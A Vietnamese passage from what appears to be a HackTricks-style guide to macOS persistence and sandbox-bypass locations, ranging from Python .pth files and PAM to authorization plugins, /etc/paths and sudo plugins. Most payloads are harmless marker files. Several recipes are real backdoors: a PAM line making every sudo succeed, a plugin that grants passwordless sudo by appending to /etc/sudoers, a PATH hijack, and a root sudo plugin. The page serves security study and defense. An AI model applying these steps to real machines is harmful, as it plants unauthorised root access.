Launch Services lấy thông tin khai báo URL-scheme và tài liệu từ `Info.plist` của app đã đăng ký. [Hướng dẫn đăng ký của Apple](https://developer.apple.com/library/archive/documentation/Carbon/Conceptual/LaunchServicesConcepts/LSCTasks/LSCTasks.html) cho biết việc đăng ký có thể diễn ra khi Finder phát hiện app, lúc khởi động hoặc đăng nhập, hoặc thông qua API đăng ký tường minh; chỉ ghi app vào một vị trí nào đó không đảm bảo sẽ kích hoạt ngay. Sau khi đăng ký, việc mở URL hoặc tài liệu khớp có thể khởi chạy app xử lý đã chọn, tùy thuộc vào lựa chọn trình xử lý mặc định của người dùng và các bước kiểm tra khởi chạy thông thường của macOS. API được hỗ trợ `LSSetDefaultHandlerForURLScheme` thay đổi trình xử lý URL mà người dùng ưu tiên; API này không khiến một app vừa được thả vào tự động thực thi.<sup>[[52]](#references)</sup>

```bash
# Inspect known handlers without registering an app or changing defaults
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -dump | grep -A3 "scheme:"
```

Không có ứng dụng nào được đăng ký và không có tùy chọn ưu tiên handler nào bị thay đổi trên máy Mac nghiên cứu chạy macOS 26.5.2. Để kiểm thử một handler thực tế, hãy dùng tài khoản người dùng dùng một lần, đăng ký một ứng dụng chỉ tạo dấu hiệu với scheme duy nhất, gọi URL của ứng dụng đó, rồi gỡ ứng dụng và đăng ký của nó.

Để tìm hiểu chuyên sâu về cách liệt kê/lạm dụng handler cho phần mở rộng tệp và URL scheme, xem:

{{#ref}}
macos-security-and-privilege-escalation/macos-file-extension-apps.md
{{#endref}}

### Tệp khởi động Python (`.pth` / `usercustomize` / `sitecustomize`)

Bài viết: [https://docs.python.org/3/library/site.html](https://docs.python.org/3/library/site.html)<sup>[[56]](#references)</sup>

- Hữu ích để bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Chạy khi trình thông dịch Python tương ứng khởi động với thư mục site đó được bật; trigger này không áp dụng đồng nhất cho mọi virtual environment, bản dựng Python hoặc startup flag
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Chạy với quyền/TCC của tiến trình khởi chạy trình thông dịch

#### Vị trí

- **`$(python3 -m site --user-site)/*.pth`** (bản dựng macOS framework: `~/Library/Python/<X.Y>/lib/python/site-packages/`)
  - Không cần root (người dùng có thể ghi)
  - **Trigger**: khởi động bản dựng Python đó khi user site được bật; module `site` xử lý các tệp `.pth` trong những thư mục site đang hoạt động
- **`<user-site>/usercustomize.py`**
  - Không cần root
  - **Trigger**: khởi động khi user site được bật (được `site` tự động import)
- **`<prefix>/site-packages/sitecustomize.py`** (ví dụ: `/opt/homebrew/lib/python3.13/site-packages/`, hoặc các đường dẫn hệ thống)
  - Có thể cần root/admin tùy thuộc vào vị trí của trình thông dịch
  - **Trigger**: khởi động trình thông dịch có bao gồm thư mục site đó

#### Mô tả & Khai thác

Khi khởi động, Python thường import `site` và quét các thư mục `site-packages` đang hoạt động để tìm tệp `.pth`. Ngoài việc thêm đường dẫn, một dòng `.pth` bắt đầu bằng `import ` sẽ thực thi mã Python ngay cả khi module được nêu tên không được dùng theo cách nào khác. Python cũng thử import `sitecustomize` và, **khi user site được bật**, `usercustomize`.<sup>[[56]](#references)</sup> Trigger xảy ra ở lần khởi động sau của trình thông dịch có thể truy cập thư mục đã chỉnh sửa. `-S` tắt xử lý `site`; `-s`, `-I` hoặc `PYTHONNOUSERSITE` tắt các biến thể **user-site**. Nhìn chung, `-I` không tắt `sitecustomize` toàn cục. Virtual environment cũng có thể loại trừ user site. Hãy kiểm tra `python3 -m site` để biết thông tin của trình thông dịch cụ thể.

PoC sau được chạy trên macOS 26.5.2. `PYTHONUSERBASE` chuyển user site vào một thư mục tạm thời cho bài kiểm thử này; không có user site thực nào bị sửa đổi:

```python
import os, pathlib, subprocess, tempfile

with tempfile.TemporaryDirectory(prefix='ht-python-site-') as root:
    env = os.environ.copy()
    env['PYTHONUSERBASE'] = root
    env.pop('PYTHONNOUSERSITE', None)
    user_site = pathlib.Path(subprocess.check_output(
        ['python3', '-m', 'site', '--user-site'], env=env, text=True
    ).strip())
    user_site.mkdir(parents=True)
    pth_marker = pathlib.Path(root) / 'pth.marker'
    user_marker = pathlib.Path(root) / 'user.marker'
    (user_site / 'ht_probe.pth').write_text(
        'import pathlib; pathlib.Path(' + repr(str(pth_marker)) + ').touch()\n'
    )
    (user_site / 'usercustomize.py').write_text(
        'import pathlib; pathlib.Path(' + repr(str(user_marker)) + ').touch()\n'
    )
    subprocess.run(['python3', '-c', 'pass'], env=env, check=True)
    print('pth:', pth_marker.exists(), 'usercustomize:', user_marker.exists())
```

Both markers appeared. Lặp lại với `-s`, `-I` hoặc `-S` đã ngăn cả hai marker **user-site** trong thử nghiệm này. Chưa thử nghiệm `sitecustomize` trong thư mục site toàn cục.

## Root Sandbox Bypass

> [!TIP]
> Tại đây, bạn có thể tìm thấy các vị trí khởi chạy hữu ích cho **sandbox bypass**, cho phép bạn chỉ cần **ghi nội dung vào một tệp** để thực thi thứ gì đó khi có quyền **root** và/hoặc khi cần đáp ứng các **điều kiện bất thường khác.**

### Periodic

> [!CAUTION]
> **Cơ chế lịch sử:** Trên máy thử nghiệm macOS 26.5.2, `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` và các launch daemon `com.apple.periodic-*` đều không tồn tại. Đừng cho rằng việc tạo `/etc/periodic` trên hệ thống hiện tại sẽ lên lịch chạy nội dung bên trong. Hãy kiểm tra cả lệnh lẫn scheduler đã bật trên phiên bản mục tiêu trước khi sử dụng ví dụ bên dưới.

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Hữu ích để bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Nhưng cần có quyền root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Cần quyền root
  - **Kích hoạt**: Khi đến thời điểm
- `/etc/daily.local`, `/etc/weekly.local` hoặc `/etc/monthly.local`
  - Cần quyền root
  - **Kích hoạt**: Khi đến thời điểm

#### Mô tả & Khai thác

Trên các phiên bản cũ hơn, các script periodic (**`/etc/periodic`**) được lên lịch bởi **launch daemon** trong `/System/Library/LaunchDaemons/com.apple.periodic*`. Kể từ macOS Big Sur 11.5, trình chạy periodic thực thi các script trong thư mục periodic với tư cách **chủ sở hữu của từng tệp**, khép lại một con đường leo thang đặc quyền trước đây.<sup>[[27]](#references)</sup> Các lệnh và danh sách thư mục bên dưới là đầu ra lịch sử, không phải kết quả thử nghiệm trên macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Có các script định kỳ khác sẽ được thực thi, được chỉ định trong **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Trên các hệ thống cũ có cài đặt và bật `periodic` cùng các launch daemon của nó, `/etc/daily.local`, `/etc/weekly.local` và `/etc/monthly.local` là các đường dẫn thực thi bổ sung. Một kiểm tra chỉ đọc, vô hại là:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Quy tắc dựa trên chủ sở hữu được áp dụng cho các script nằm trực tiếp trong các thư mục chạy định kỳ. Wrapper `999.local` trước đây dùng để source `/etc/daily.local`, `/etc/weekly.local` hoặc `/etc/monthly.local` mà không thực hiện cùng bước kiểm tra quyền sở hữu đó; khi bộ lập lịch chạy với quyền root, các tệp cục bộ này cũng chạy với quyền root. Sự khác biệt này và thay đổi trong Big Sur 11.5 được ghi lại trong [nghiên cứu gốc](https://theevilbit.github.io/beyond/beyond_0019/). Không nên giả định bất kỳ đường dẫn nào trong số này đang hoạt động nếu không có `periodic`.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Hữu ích để bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Nhưng bạn cần có quyền root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- Luôn cần quyền root

#### Mô tả & Khai thác

Vì PAM tập trung vào **persistence** và malware hơn là khả năng thực thi dễ dàng trong macOS, bài viết này sẽ không giải thích chi tiết; **hãy đọc các writeup để hiểu rõ hơn về kỹ thuật này**.<sup>[[28]](#references)</sup>

Kiểm tra các module PAM bằng lệnh:

```bash
ls -l /etc/pam.d
```

Một kỹ thuật persistence/privilege escalation lợi dụng PAM rất đơn giản: chỉ cần sửa module `/etc/pam.d/sudo` và thêm dòng sau vào đầu tệp:

```bash
auth       sufficient     pam_permit.so
```

Vì vậy, nó sẽ **trông giống** như thế này:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

Và do đó, mọi nỗ lực sử dụng **`sudo` đều sẽ thành công**.

> [!CAUTION]
> Lưu ý rằng thư mục này được TCC bảo vệ, vì vậy rất có thể người dùng sẽ nhận được lời nhắc yêu cầu cấp quyền truy cập.

Một ví dụ hay khác là `su`, nơi bạn có thể thấy rằng cũng có thể truyền tham số cho các module PAM (và bạn cũng có thể backdoor tệp này):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Plugin ủy quyền

Bài viết: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Bài viết: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Hữu ích để bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Nhưng bạn cần có quyền root và thiết lập thêm cấu hình
- TCC bypass: ???

#### Vị trí

- `/Library/Security/SecurityAgentPlugins/`
  - Cần quyền root
  - Bạn cũng cần cấu hình authorization database để sử dụng plugin

#### Mô tả & Khai thác

Bạn có thể tạo một authorization plugin sẽ được thực thi khi người dùng đăng nhập để duy trì persistence. Để biết thêm thông tin về cách tạo loại plugin này, hãy xem các bài viết trước (và hãy cẩn thận: nếu viết không tốt, plugin có thể khiến bạn không thể đăng nhập và bạn sẽ cần dọn dẹp máy Mac từ recovery mode).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Di chuyển** bundle đến vị trí sẽ được tải:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Cuối cùng, thêm **rule** để tải Plugin này:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** sẽ thông báo cho authorization framework rằng nó cần **gọi một mechanism bên ngoài để cấp quyền**. Ngoài ra, **`privileged`** sẽ khiến nó được thực thi bởi root.

Kích hoạt nó bằng:

```bash
security authorize com.asdf.asdf
```

Và sau đó, **nhóm staff phải có quyền sudo** (đọc `/etc/sudoers` để xác nhận).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Hữu ích để bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Nhưng bạn cần quyền root và người dùng phải sử dụng man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- **`/private/etc/man.conf`**
  - Cần quyền root
  - **`/private/etc/man.conf`**: Bất cứ khi nào man được sử dụng

#### Mô tả & Khai thác

File cấu hình **`/private/etc/man.conf`** chỉ định binary/script sẽ được dùng khi mở các file tài liệu man. Vì vậy, có thể sửa đường dẫn đến executable để mỗi khi người dùng dùng man đọc tài liệu, một backdoor sẽ được thực thi.<sup>[[31]](#references)</sup>

Ví dụ, thiết lập trong **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

Sau đó tạo `/tmp/view` như sau:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Hữu ích để bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Nhưng bạn cần có quyền root và apache phải đang chạy
- Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd không có entitlements

#### Vị trí

- **`/etc/apache2/httpd.conf`**
  - Cần quyền root
  - Kích hoạt: Khi Apache2 được khởi động

#### Mô tả & khai thác

Bạn có thể chỉ định trong `/etc/apache2/httpd.conf` để tải một module bằng cách thêm một dòng như sau:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Bằng cách này, module đã biên dịch của bạn sẽ được Apache tải. Điều duy nhất cần làm là **ký module bằng chứng chỉ Apple hợp lệ**, hoặc **thêm chứng chỉ đáng tin cậy mới** vào hệ thống rồi **dùng chứng chỉ đó để ký module**.

Sau đó, nếu cần, để đảm bảo máy chủ được khởi động, bạn có thể thực thi:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Ví dụ mã cho Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### Khung kiểm tra BSM

Bài viết: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Hữu ích để bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Nhưng bạn cần quyền root, auditd đang chạy và phải gây ra cảnh báo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Vị trí

- **`/etc/security/audit_warn`**
  - Cần quyền root
  - **Kích hoạt**: Khi auditd phát hiện cảnh báo

#### Mô tả & khai thác

Bất cứ khi nào auditd phát hiện cảnh báo, script **`/etc/security/audit_warn`** sẽ được **thực thi**. Vì vậy, bạn có thể thêm payload vào đó.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Bạn có thể buộc hiển thị cảnh báo bằng `sudo audit -n`.

### Startup Items

> [!CAUTION] > **Tính năng này đã lỗi thời, vì vậy không nên tìm thấy gì trong các thư mục đó.**

**StartupItem** là một thư mục cần nằm trong `/Library/StartupItems/` hoặc `/System/Library/StartupItems/`. Sau khi tạo thư mục này, bên trong phải có hai tệp cụ thể:

1. **rc script**: Một shell script được thực thi khi khởi động.
2. Một tệp **plist**, có tên cụ thể là `StartupParameters.plist`, chứa nhiều cài đặt cấu hình.

Đảm bảo cả rc script và tệp `StartupParameters.plist` đều được đặt đúng bên trong thư mục **StartupItem** để quy trình khởi động nhận diện và sử dụng chúng.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Tôi không tìm thấy thành phần này trên macOS của mình, vì vậy hãy xem writeup để biết thêm thông tin

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Được Apple giới thiệu, **emond** là một cơ chế ghi log có vẻ chưa được phát triển hoàn thiện hoặc có thể đã bị bỏ dở, nhưng vẫn có thể truy cập. Dù không đặc biệt hữu ích với quản trị viên Mac, dịch vụ ít người biết đến này có thể là một phương thức duy trì quyền truy cập kín đáo cho các tác nhân đe dọa, nhiều khả năng không bị phần lớn quản trị viên macOS phát hiện.<sup>[[34]](#references)</sup>

Với những người biết đến sự tồn tại của nó, việc xác định mọi hành vi sử dụng **emond** độc hại khá đơn giản. LaunchDaemon của dịch vụ này trên hệ thống tìm các script cần thực thi trong một thư mục duy nhất. Có thể dùng lệnh sau để kiểm tra:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Vị trí

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Cần quyền root
  - **Kích hoạt**: Khi có XQuartz

#### Mô tả & Khai thác

XQuartz **không còn được cài đặt trên macOS**, vì vậy hãy xem writeup nếu bạn muốn biết thêm.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Việc cài đặt kext phức tạp đến mức, ngay cả khi có quyền root, đây không được xem là kỹ thuật vượt sandbox hoặc persistence thực tế trừ khi bạn có exploit.

#### Vị trí

Để cài đặt KEXT dưới dạng mục khởi động, nó cần được **cài đặt tại một trong các vị trí sau**:

- `/System/Library/Extensions`
  - Các tệp KEXT được tích hợp trong hệ điều hành OS X.
- `/Library/Extensions`
  - Các tệp KEXT được cài đặt bởi phần mềm bên thứ ba

Bạn có thể liệt kê các tệp kext hiện đang được tải bằng:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Để biết thêm thông tin về [**kernel extensions, hãy xem phần này**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Vị trí

- **`/usr/local/bin/amstoold`**
  - Cần quyền root

#### Mô tả & khai thác

Có vẻ như `plist` tại `/System/Library/LaunchAgents/com.apple.amstoold.plist` đang sử dụng binary này đồng thời cung cấp một XPC service... vấn đề là binary đó không tồn tại, vì vậy bạn có thể đặt một thứ gì đó ở đó và khi XPC service được gọi, binary của bạn sẽ được gọi.<sup>[[35]](#references)</sup>

Tôi không còn tìm thấy nó trong macOS của mình.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Vị trí

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Cần quyền root
  - **Kích hoạt**: Khi service được chạy (hiếm khi)

#### Mô tả & khai thác

Có vẻ như script này không thường được chạy và tôi thậm chí không tìm thấy nó trong macOS của mình, vì vậy hãy xem writeup nếu bạn muốn biết thêm thông tin.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Cách này không hoạt động trên các phiên bản MacOS hiện đại**

Bạn cũng có thể đặt tại đây **các lệnh sẽ được thực thi khi khởi động.** Ví dụ về một script rc.common thông thường:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### Tác vụ khởi động của launchd

Bài viết: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Hữu ích để bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (cần root)
- Cần root, cùng với **SIP bypass** hoặc quyền **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, tùy theo đường dẫn

#### Vị trí

`launchd` nhúng một plist trong phần **`__TEXT,__config`** mô tả các "tác vụ khởi động" sớm. Một số script/binary được tham chiếu không tồn tại theo mặc định và có thể được attacker tạo ra:

- Nhóm SIP bypass: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- Nhóm TCC/FDA: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` chỉ tồn tại sẵn trên Sequoia trở lên)

#### Mô tả & khai thác

Dump bảng tác vụ được nhúng để xem những tệp nào `launchd` sẽ chạy và các key được hỗ trợ (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Việc tạo một trong các tệp được tham chiếu (ví dụ: `/etc/rc.server`) khiến `launchd` thực thi tệp đó trong lần khởi động lại (userspace) tiếp theo. Các mục hữu ích nhất bị giới hạn bởi SIP hoặc yêu cầu TCC SysAdminFiles/Full Disk Access, nên đây là kỹ thuật cấp root, được kích hoạt khi khởi động lại.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Bài phân tích: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Tác vụ khởi động `rc.trampoline` chạy một **binary nền tảng (do Apple ký)** được lưu trong biến NVRAM `apple-trusted-trampoline` khi khởi động, nhưng **chỉ khi boot-arg `rc.trampoline=1` được đặt và SIP bị tắt** (với giới hạn kích thước khoảng 390&nbsp;KB và yêu cầu không chặn/phải trả về nhanh). Vì yêu cầu **root + SIP bị tắt + payload do Apple ký**, kỹ thuật này về cơ bản không thực tế để duy trì quyền truy cập trong môi trường thực tế và chỉ được liệt kê ở đây để đầy đủ.<sup>[[41]](#references)</sup>

### /etc/paths và /etc/paths.d (PATH hijack)

- Hữu ích để vượt qua sandbox: [🔴](https://emojipedia.org/large-red-circle) (cần root để ghi)
- Cần root

#### Vị trí

- **`/etc/paths`** và **`/etc/paths.d/*`** — được **`path_helper`** đọc (được gọi từ `/etc/zprofile`) để tạo `PATH` mặc định khi đăng nhập.

#### Mô tả & Khai thác

Cả hai đều thuộc sở hữu của root. Thêm một thư mục do kẻ tấn công kiểm soát lên đầu danh sách (bằng cách chỉnh sửa `/etc/paths` hoặc thả một tệp vào `/etc/paths.d/`) khiến thư mục đó xuất hiện sớm trong `PATH` của mọi shell đăng nhập mới. Do đó, một binary độc hại có tên giống lệnh phổ biến (`ls`, `git`, …) sẽ **che khuất** binary thật và chạy vào lần tiếp theo nạn nhân gọi lệnh đó.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Hữu ích để bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (cần root)
- Cần root; kết quả **bypass SIP**. Các phiên bản macOS **15.0–15.1** bị ảnh hưởng, đã được khắc phục trong **15.2**

#### Vị trí

- Đặt một filesystem bundle trong **`/Library/Filesystems/`**.

#### Mô tả & Khai thác

`storagekitd` có entitlement **`com.apple.rootless.install.heritable`** và khởi chạy các binary của filesystem bundle với khả năng bypass SIP đó **được kế thừa**. Bằng cách đặt một filesystem bundle độc hại, kẻ tấn công có thể chạy code để bypass SIP nhằm cài đặt **kernel extension tồn tại dai dẳng** hoặc ghi vào các thư mục `LaunchDaemon` được SIP bảo vệ — cơ chế persistence này tồn tại lâu dài và vô hiệu hóa các biện pháp bảo vệ thông thường.<sup>[[46]](#references)</sup> Apple đã khắc phục lỗi này trong macOS Sequoia 15.2.

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Hữu ích để bypass sandbox: [🔴](https://emojipedia.org/large-red-circle) (cần root để ghi vào `/etc/sudo.conf`)
- Cần root để cài đặt; sau đó plugin chạy trong **mọi lần gọi `sudo`** (ngữ cảnh setuid-root)

#### Vị trí

- **`/etc/sudo.conf`** — các dòng `Plugin` tải shared object từ **`/usr/libexec/sudo/`** (hoặc từ một đường dẫn tuyệt đối). Mặc định tệp này không tồn tại (sudo dùng policy tích hợp sẵn), vì vậy tạo tệp này sẽ tạo một hook gọn gàng.

#### Mô tả & Khai thác

`sudo` tải các plugin policy/approval/audit từ `/etc/sudo.conf`. Vì `sudo` là setuid-root, plugin shared-object độc hại sẽ chạy với **đặc quyền root mỗi khi bất kỳ người dùng nào chạy `sudo`** — cơ chế root persistence lâu dài, đồng thời có thể theo dõi từng lệnh sudo.<sup>[[51]](#references)</sup> macOS đi kèm sudo 1.9.x, phiên bản hỗ trợ plugin API.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

